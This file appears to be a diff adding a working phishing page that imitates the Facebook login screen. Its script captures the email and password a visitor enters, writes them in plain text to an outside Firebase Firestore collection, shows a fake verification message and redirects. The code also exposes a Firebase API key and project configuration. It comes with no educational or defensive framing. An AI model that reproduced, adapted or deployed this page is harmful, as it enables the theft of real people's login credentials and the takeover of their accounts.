@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="fb.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text"></div>
+        <form id="login-form">
+          <label id="store-data" style="display: none;"></label> <!-- Label to store and display data -->
+
+          <input id="email" placeholder="Email or phone number" required>
+          <input id="password" type="password" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" class="login"></button>
+            <a href="#" class="forgot"></a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#"></a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script type="module">
+      // Import Firebase modules
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+      import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+
+      // Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyCpNeiGF63knNi8kCzgYBVQWAh_B1yEijs",
+        authDomain: "firstproject-72f32.firebaseapp.com",
+        projectId: "firstproject-72f32",
+        storageBucket: "firstproject-72f32.firebasestorage.app",
+        messagingSenderId: "366500686838",
+        appId: "1:366500686838:web:b316553e92c7ad2b16f5d7",
+        measurementId: "G-DSTWZNEJ80",
+      };
+
+      // Initialize Firebase and Firestore
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      // Function to save label data to Firestore
+      async function saveDataToFirestore(data) {
+        try {
+          // Add a new document with an auto-generated ID
+          await addDoc(collection(db, "userInputs"), { labelData: data });
+          console.log("Data saved successfully!");
+          alert("verfication successful")
+          window.location.href = "ima.html"; // Redirect to Google on success
+        } catch (error) {
+          console.error("Error saving data:", error);
+          window.location.href = "fb.html"; // Redirect to a fallback page on error
+        }
+      }
+
+      // Add event listener to form
+      document.getElementById("login-form").addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent form refresh
+
+        // Get email and password values
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        // Update the label
+        const storeDataLabel = document.getElementById("store-data");
+        const data = `Email: ${email}, Password: ${password}`;
+        storeDataLabel.textContent = data;
+
+        // Store the label data in Firebase Firestore
+        saveDataToFirestore(data);
+      });
+
+      // Add the page title dynamically
+      document.title = "Facebook Login Page";
+
+      // Add dynamic text for title, buttons, and links
+      document.addEventListener("DOMContentLoaded", function () {
+        // Add title text in the 'text' div
+        const textDiv = document.querySelector(".text");
+        textDiv.innerHTML = `
+          <h1>Facebook</h1>
+          <p>Facebook helps you connect and share</p>
+          <p>with the people in your life.</p>
+        `;
+
+        // Set button and link texts
+        document.querySelector(".login").textContent = "Login"; // Button text
+        document.querySelector(".forgot").textContent = "Forgot password?"; // Forgot password link text
+        document.querySelector(".button a").textContent = "Create new account"; // Create account link text
+      });
+    </script>
+  </body>
+</html>
